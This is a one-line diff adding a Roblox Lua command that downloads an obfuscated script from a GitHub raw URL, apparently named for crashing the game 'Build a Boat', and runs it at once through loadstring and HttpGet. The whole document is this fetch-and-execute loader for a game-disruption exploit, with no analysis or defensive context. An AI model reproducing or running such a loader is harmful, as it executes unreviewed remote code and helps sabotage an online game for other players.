@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/max2007killer/Crash-Build-a-boat/main/obf%20build%20a%20boat.txt'),true))()
